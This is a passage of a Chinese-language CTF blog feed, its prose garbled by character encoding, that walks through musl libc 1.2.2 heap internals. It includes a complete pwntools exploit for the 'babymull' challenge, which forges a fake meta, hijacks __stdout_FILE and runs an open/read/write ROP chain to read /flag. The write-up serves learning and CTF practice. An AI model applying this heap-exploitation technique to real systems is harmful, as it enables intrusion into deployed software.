class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç”³è¯·4ä¸ªchunkä¹‹ågdbæŸ¥çœ‹metaç»“æ„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912153822227.png" alt="image-20210912153822227"></p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912154050548.png" alt="image-20210912154050548"></p><blockquote><p><code>0x7fb8fbfa9ce0</code>æ˜¯<code>user data</code>åŸŸï¼›<br><code>avail_mask = 1008 = 0b11 1111 0000</code>è¡¨ç¤ºç¬¬0ã€1ã€2ã€3ä¸ªchunkä¸å¯ç”¨ï¼ˆå·²ç»è¢«ä½¿ç”¨ï¼‰ï¼›<br><code>freed_mask = 0</code>è¡¨ç¤ºæ²¡æœ‰chunkè¢«é‡Šæ”¾ï¼›<br><code>last_idx = 9</code>è¡¨ç¤ºæœ€åä¸€ä¸ªchunkçš„ä¸‹æ ‡æ˜¯9ï¼Œæ€»æ•°æ˜¯10ä¸ª<br><code>sizeclass = 2</code>è¡¨ç¤ºç”±<code>2</code>è¿™ä¸ªgroupè¿›è¡Œç®¡ç†ã€‚</p></blockquote><p>å½“æˆ‘ä»¬æŠŠ2è¿™ä¸ªgroupé‡Œ10ä¸ªchunkéƒ½ä½¿ç”¨æ‰ï¼Œä¹‹åç”³è¯·å°±ä¼šå¼€è¾Ÿç¬¬äºŒä¸ªmetaé¡µè¿›è¡Œç®¡ç†ï¼Œä¸¤ä¸ªmetaä¹‹é—´ç”±ä¸€ä¸ªåŒå‘é“¾è¡¨è¿›è¡Œç»´æŠ¤ï¼›</p><h4 id="groupé‡Œçš„chunkç»“æ„"><a href="#groupé‡Œçš„chunkç»“æ„" class="headerlink" title="groupé‡Œçš„chunkç»“æ„"></a><strong>groupé‡Œçš„chunkç»“æ„</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struck chunk&#123;</span><br><span class="line">    uint8 zero;</span><br><span class="line">    uint8 idx;  <span class="comment">// ä½7ä½æ˜¯idxï¼Œ é«˜5ä½æ˜¯reserved</span></span><br><span class="line">    uint16 offset;</span><br><span class="line">    <span class="keyword">char</span>[] usermem; <span class="comment">// &lt;--ç”¨æˆ·æ‹¿åˆ°çš„å†…å­˜</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±ä¸Šå›¾metaç»“æ„ä¸­çš„memæŒ‡é’ˆæŸ¥çœ‹<code>user data</code>åŸŸ</p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912160425927.png" alt="image-20210912160425927"></p><p>éœ€è¦æ³¨æ„ï¼Œåˆ†é…ç»™ç”¨æˆ·çš„ æœ€å°chunk size æ˜¯0x8</p><p>å’Œglibcç±»ä¼¼ï¼Œå¯ä»¥è¿›è¡Œ<strong>å¤ç”¨</strong>ï¼Œå¯ä»¥æ¥æ”¶è¾“å…¥<code>8+4</code>ä¸ªbyteï¼Œ<strong>å ç”¨ä¸‹ä¸€ä¸ªchunk headerçš„å‰4ä¸ªbyte</strong></p><h4 id="é‡Šæ”¾-chunkä¹‹åmetaç»“æ„å˜åŒ–"><a href="#é‡Šæ”¾-chunkä¹‹åmetaç»“æ„å˜åŒ–" class="headerlink" title="é‡Šæ”¾ chunkä¹‹åmetaç»“æ„å˜åŒ–"></a><strong>é‡Šæ”¾ chunkä¹‹åmetaç»“æ„å˜åŒ–</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>, b<span class="string">&quot;B&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>, b<span class="string">&quot;C&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct meta*)<span class="number">0</span>x55555688b1f8</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  prev = <span class="number">0</span>x55555688b1f8, </span><br><span class="line">  next = <span class="number">0</span>x55555688b1f8, </span><br><span class="line">  mem = <span class="number">0</span>x7f9d4c0fbce0, </span><br><span class="line">  avail_mask = <span class="number">1008</span>, </span><br><span class="line">  freed_mask = <span class="number">3</span>, </span><br><span class="line">  last_idx = <span class="number">9</span>, </span><br><span class="line">  freeable = <span class="number">1</span>, </span><br><span class="line">  sizeclass = <span class="number">2</span>, </span><br><span class="line">  maplen = <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>freed_mask = 3 = 0b11</code>è¡¨ç¤ºå‰ä¸¤ä¸ªchunkè¢«é‡Šæ”¾ï¼›<br><code>avail_mask = 1008 = 0b11 1111 0000</code>å¯ä»¥å‘ç°ï¼Œavail_maskæ²¡å˜ï¼Œæ­¤æ—¶å‰ä¸¤ä¸ªchunkä»ç„¶ä¸ºä¸å¯åˆ†é…çš„çŠ¶æ€ï¼›</p><p>chunk header</p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912163514516.png" alt="image-20210912163514516"></p><p>ä¸Šé¢äº†è§£å¾—å·®ä¸å¤šäº†ï¼Œåº”è¯¥å°±å¯ä»¥çœ‹æ‡‚expäº†</p><p>å¼€å§‹å¤ç°</p><h3 id="how-to-leak-1"><a href="#how-to-leak-1" class="headerlink" title="how to leak"></a><strong>how to leak</strong></h3><p>manage chunké‡Œé¢å°±æœ‰slotæŒ‡é’ˆï¼ˆå…¶å®å°±æ˜¯chunkï¼Œä½†æ˜¯å¥½åƒåœ¨muslé‡Œé¢å«slotï¼‰ï¼Œä½†æ˜¯å‰é¢çš„nameæœ‰æˆªæ–­ç¬¦ï¼Œæ³„éœ²ä¸äº†</p><p>å½“ä¸€ä¸ªgroupçš„æ‰€æœ‰chunkéƒ½è¢«ä½¿ç”¨è¿‡äº† ï¼Œæ‰ä¼šä½¿ç”¨è¢«é‡Šæ”¾çš„chunkï¼Œ</p><p>é‚£ä¹ˆæˆ‘ä»¬å…ˆç”³è¯·å®Œ10ä¸ªchunkï¼Œå¹¶å¡«æ»¡æ•°æ®ï¼Œå†é‡Šæ”¾ä¸Šå›¾å‰ä¸¤ä¸ªæ¡†çš„chunkï¼Œ</p><p>å†ç”³è¯·ä¸¤ä¸ªsizeä¸ç­‰äº0x20çš„content_chunkï¼Œåˆ™ç¬¬äºŒä¸ªcontent_chunkçš„manage_chunkå°±æ˜¯ä¸Šå›¾ç¬¬äºŒä¸ªæ¡†çš„chunkï¼Œ</p><p>nameçš„æˆªæ–­ç¬¦å°±æ²¡æœ‰äº†ï¼Œè¿™æ ·showåŠŸèƒ½å¯ä»¥ç›´æ¥æ³„éœ²åé¢çš„æŒ‡é’ˆåŸŸ</p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912170553923.png" alt="image-20210912170553923"></p><h3 id="how-to-hijack-1"><a href="#how-to-hijack-1" class="headerlink" title="how to hijack"></a><strong>how to hijack</strong></h3><p>dele content_chunk5æ—¶</p><p>ä¼šæ ¹æ®content_chunk5çš„headä¸­çš„offsetå®šä½åˆ°å­˜æ”¾metaåœ°å€çš„åœ°å€</p><p>offsetè¢«æˆ‘ä»¬ç”¨åé—¨å‡½æ•°æ”¹ä¸ºäº†0x1000</p><p>æ‰€ä»¥å°±å®šä½åˆ°äº†chunk0å†…å·²ç»å†™å¥½çš„fake metaåœ°å€</p><p>è¿™æ ·fake metaå°±è¢«é“¾åˆ°äº†activeé‡Œ</p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912223251244.png" alt="image-20210912223251244"></p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912223348499.png" alt="image-20210912223348499"></p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912223734296.png" alt="image-20210912223734296"></p><p>ä¹‹åå†edit chunk0 </p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210913101355722.png" alt="image-20210913101355722"></p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210913103019896.png" alt="image-20210913103019896"></p><p>è¿™ç¯‡æ–°ç©ºé—´åˆšå¥½å¯ä»¥ç”¨æ¥å†™orw_rop</p><p>ä¹‹åç”³è¯·0x800çš„chunkå°±åˆšå¥½èƒ½ç”³è¯·åˆ°stdout_FILE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;119.3.81.43&#x27;</span>, <span class="number">49153</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;./libc.so&quot;</span>,<span class="string">&quot;./babymull&quot;</span>])</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">Size,content=<span class="string">&#x27;A&#x27;</span>, name=<span class="string">b&quot;A&quot;</span>*<span class="number">0xf</span></span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">&#x27;Name: &#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(Size))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">set_zero,leak_addr</span>):</span></span><br><span class="line">    menu(<span class="number">0x73317331</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(set_zero))</span><br><span class="line">    sl(<span class="built_in">str</span>(leak_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">0x20</span>) <span class="comment"># fill group2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>)                       <span class="comment"># 0 use manage_chunk0</span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x238</span> + p32(<span class="number">0x5</span>)) <span class="comment"># 5 use content_chunk0        why p32(0x5)????</span></span><br><span class="line"><span class="comment">#                                   # fake reserved_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Leak libc address</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc.address = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) + <span class="number">0x2aa0</span> +<span class="number">0x6000</span></span><br><span class="line">leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line">mmap_base = libc.address - <span class="number">0xa000</span> </span><br><span class="line">leak(<span class="string">&#x27;mmap_base&#x27;</span>,mmap_base)</span><br><span class="line">leak(<span class="string">&#x27;mmap_base + 0x1560 -8 + 6&#x27;</span>,mmap_base + <span class="number">0x1560</span> -<span class="number">8</span> + <span class="number">6</span>)</span><br><span class="line">leak(<span class="string">&#x27;malloc_context&#x27;</span>,libc.symbols[<span class="string">&#x27;__malloc_context&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify head of content_chunk_5 // offset 0x1550-&gt;0x1000</span></span><br><span class="line"><span class="comment"># leak __malloc_context-&gt;secrect</span></span><br><span class="line">gift(mmap_base + <span class="number">0x1560</span> -<span class="number">8</span> + <span class="number">6</span> ,libc.symbols[<span class="string">&#x27;__malloc_context&#x27;</span>])</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">secret = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;secret&#x27;</span>,secret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Construct fake_meta and fake_meta_arena</span></span><br><span class="line">fake_meta     = mmap_base+<span class="number">0x1000</span>+<span class="number">8</span></span><br><span class="line">fake_meta_ptr = mmap_base+<span class="number">0x550</span></span><br><span class="line"><span class="comment"># fake_meta_ptr</span></span><br><span class="line">pp  = flat(&#123;<span class="number">0x550</span>-<span class="number">0x30</span>: fake_meta&#125;, filler=<span class="string">&#x27;\x00&#x27;</span>, length=<span class="number">0x1000</span>-<span class="number">0x30</span>) </span><br><span class="line"><span class="comment"># fake meta_arena</span></span><br><span class="line">pp += p64(secret) <span class="comment"># area-&gt;check</span></span><br><span class="line"><span class="comment"># fake meta</span></span><br><span class="line">pp += flat([<span class="number">0</span>, <span class="number">0</span>,            <span class="comment"># meta-&gt;prev, meta-&gt;next</span></span><br><span class="line">            fake_meta_ptr,   <span class="comment"># meta-&gt;mem</span></span><br><span class="line">            <span class="number">0</span>,               <span class="comment"># meta-&gt;avail_mask, meta-&gt;freed_mask</span></span><br><span class="line">            (<span class="number">24</span>&lt;&lt;<span class="number">6</span>)+<span class="number">1</span>        <span class="comment"># meta-&gt;sizeclass, meta-&gt;last_idx </span></span><br><span class="line">        ])</span><br><span class="line">leak(<span class="string">&#x27;fake_meta&#x27;</span>,fake_meta)</span><br><span class="line">leak(<span class="string">&#x27;fake_meta_ptr&#x27;</span>,fake_meta_ptr)</span><br><span class="line"><span class="comment">#edit chunk0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,pp) <span class="comment"># write fake meta to chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># insert fake meta</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit chunk0(fake meta-&gt;mem to __stdout_FILE)  // uaf bin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">0x40</span>+<span class="number">8</span>) + flat([<span class="number">0</span>, <span class="number">0</span>, libc.symbols[<span class="string">&quot;__stdout_FILE&quot;</span>]-<span class="number">0x940</span>, <span class="number">2</span>, (<span class="number">24</span>&lt;&lt;<span class="number">6</span>)+<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Build orw ROP</span></span><br><span class="line"></span><br><span class="line">buf       = mmap_base + <span class="number">0x2aa0</span></span><br><span class="line">leak(<span class="string">&#x27;buf&#x27;</span>,buf)</span><br><span class="line">rop_chain = mmap_base + <span class="number">0x2ba0</span></span><br><span class="line">leak(<span class="string">&#x27;rop_chain&#x27;</span>,rop_chain)</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x15536</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x1b3a9</span></span><br><span class="line">pop_rdx = libc.address + <span class="number">0x4727c</span></span><br><span class="line">xchg_eax_edi = libc.address + <span class="number">0x26e75</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>  = libc.symbols[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read  = libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write = libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">rop = flat([</span><br><span class="line">    pop_rdi, buf,</span><br><span class="line">    pop_rsi, <span class="number">0</span>,</span><br><span class="line">    <span class="built_in">open</span>,           <span class="comment"># open(&quot;/flag&quot;, 0)</span></span><br><span class="line">    xchg_eax_edi,   <span class="comment">#xchg   edi,eax; ret</span></span><br><span class="line">    pop_rsi, buf,</span><br><span class="line">    pop_rdx, <span class="number">0x100</span>,</span><br><span class="line">    read,           <span class="comment"># read(fd, buf, 0x100)</span></span><br><span class="line">    pop_rdi, <span class="number">1</span>,</span><br><span class="line">    pop_rsi, buf,</span><br><span class="line">    pop_rdx, <span class="number">0x100</span>,</span><br><span class="line">    write,          <span class="comment"># write(1, buf, 0x100)</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&quot;/flag&quot;</span>.ljust(<span class="number">0x100</span>, <span class="string">&#x27;\x00&#x27;</span>) + rop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment">### Build fake __stdout_FILE</span></span><br><span class="line"><span class="comment"># 0x15238: ret; </span></span><br><span class="line">ret       = libc.address + <span class="number">0x15238</span></span><br><span class="line"><span class="comment"># 0x4bcf3: mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38]; </span></span><br><span class="line">stack_mig = libc.address + <span class="number">0x4bcf3</span></span><br><span class="line"></span><br><span class="line">stdout = flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">1</span>,         <span class="comment"># f-&gt;wpos</span></span><br><span class="line">    <span class="number">0x28</span>: <span class="number">1</span>,         <span class="comment"># f-&gt;wend</span></span><br><span class="line">    <span class="number">0x30</span>: rop_chain, </span><br><span class="line">    <span class="number">0x38</span>: ret, </span><br><span class="line">    <span class="number">0x48</span>: stack_mig  <span class="comment"># f-&gt;write</span></span><br><span class="line">&#125;,filler=<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> stdout</span><br><span class="line"><span class="comment">### Overwrite __stdout_FILE</span></span><br><span class="line">add(<span class="number">0x800</span>, stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h3 id="ç–‘é—®"><a href="#ç–‘é—®" class="headerlink" title="ç–‘é—®"></a><strong>ç–‘é—®</strong></h3><p>ä¸ºä»€ä¹ˆadd 0x800å¤§å°çš„chunkå°±å¯ä»¥ç›´æ¥ç”³è¯·åˆ°stdout_FILEï¼Œè€Œä¸æ˜¯ä»è¢«é‡Šæ”¾çš„0x1000chunkå¼€å¤´å¼€å§‹ï¼ˆstdout_FILE - 0x940ï¼‰?</p><p>ä¸ºä»€ä¹ˆcontent_chunk5ï¼ˆ0x1000ï¼‰ä¸€å¼€å§‹è¦åœ¨0x238åç§»åå†™å…¥p32(5)ï¼Œå¤§æ¦‚æ˜¯ç»•è¿‡freeæ—¶çš„æ£€æŸ¥ï¼Ÿæ¯•ç«ŸæŠŠå®ƒheadå¤´çš„offsetä»0x1550æ”¹æˆäº†1000</p><hr><h1 id="3é¢˜å¾…å¤ç°"><a href="#3é¢˜å¾…å¤ç°" class="headerlink" title="3é¢˜å¾…å¤ç°"></a>3é¢˜å¾…å¤ç°</h1><p>å¼ºç½‘æ¯ 2021 easyheap</p><p><a href="https://cy2cs.top/2021/06/16/%E3%80%90ctf%E3%80%91%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-easyheap/">https://cy2cs.top/2021/06/16/%E3%80%90ctf%E3%80%91%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-easyheap/</a></p><p>DefCon_Quals_2021_mooosl</p><p><a href="https://www.anquanke.com/post/id/241104#h2-0">https://www.anquanke.com/post/id/241104#h2-0</a></p><p>RCTF_2021_musl</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$./libc.so </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.2.2</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure><p>é™æ€åˆ†æ</p><p>ç¦ç”¨äº†execve</p><p>åªèƒ½åœ¨addå†™chunk</p><p>idx&lt;=15</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">manage_chunk</span>&#123;</span> # <span class="number">0xc</span>(<span class="number">8</span>+<span class="number">4</span>)å¤ç”¨<span class="number">4</span>å­—èŠ‚ç©ºé—´</span><br><span class="line"><span class="keyword">void</span> *content_chunk_ptr; </span><br><span class="line">        <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> size - <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>free content_chunk</p><p>free manage_chunk</p><p>ä»»æ„æ¬¡æ•°show</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å‡†å¤‡å¤ç°5é“musl pwnï¼Œå…¶ä¸­4é“éƒ½æ˜¯1.2.2ç‰ˆæœ¬çš„ï¼Œæºç å®åœ¨çœ‹ä¸ä¸‹å»å‘œå‘œå‘œï¼Œè¿˜æ˜¯è·Ÿä¹‹å‰å­¦glibcä¸€æ ·ï¼Œç›´æ¥å»gdbçœ‹æ•°æ®æ¥ç†è§£ç»“æ„å’Œå†…å­˜ç®¡ç†ã€‚muslé‡Œæ²¡æœ‰malloc_hookå’Œfree_hookï¼Œæ‰€ä»¥ä¿æŠ¤å…¨å¼€çš„æ—¶å€™é€šå¸¸åªèƒ½æ‰“FILEç»“æ„ä½“ã€‚å…ˆä»ç±»ä¼¼glibcçš„1.1.24ç‰ˆæœ¬å…¥æ‰‹ã€‚&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://brooke-hub.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
